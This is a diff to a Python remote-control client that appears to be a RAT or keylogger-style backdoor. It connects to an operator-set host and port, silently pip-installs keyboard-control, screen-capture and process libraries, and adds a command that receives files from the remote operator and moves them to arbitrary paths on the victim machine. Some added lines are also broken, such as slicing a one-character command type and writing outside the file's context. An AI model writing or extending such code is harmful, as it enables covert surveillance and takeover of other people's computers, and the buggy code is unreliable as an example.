@@ -11,11 +11,15 @@ import pathlib
 try:
     import pynput
     from pynput.keyboard import Controller, Key
+    import mss
+    import psutil
 except ModuleNotFoundError:
     call(["pip", "install", "pynput"], shell=True)
+    call(["pip", "install", "psutil"], shell=True)
+    call(["pip", "install", "mss"], shell=True)
 
 # change this to your ip and port:
-HOST = "10.0.0.5"
+HOST = "10.0.0.2"
 PORT = 420
 # -----------------------------------------
 BUFFER = 4096
@@ -197,6 +201,24 @@ try:
                 recvMsg()
             else:
                 client.send(b"err")
+        # receives bytes
+        elif ctype == "b":
+            end = ctype[2:]
+            name = f"a{randint(111, 999)}{end}"
+            sendMsg(name)
+            file = client.recv(2048)
+            while file:
+                with open(f"{name}", "a") as up:
+                    up.write(file)
+                if file[-4:] != "done":
+                    up.write(file)
+                else:
+                    path = recvMsg()
+                    if exists(str(path)):
+                        call(["move", f"{name}", f'"{path}"'], shell=True)
+                        sendMsg("succ")
+                    else:
+                        sendMsg("err")
         # installation procedure
         elif ctype == "x":
             # creates the needed folders
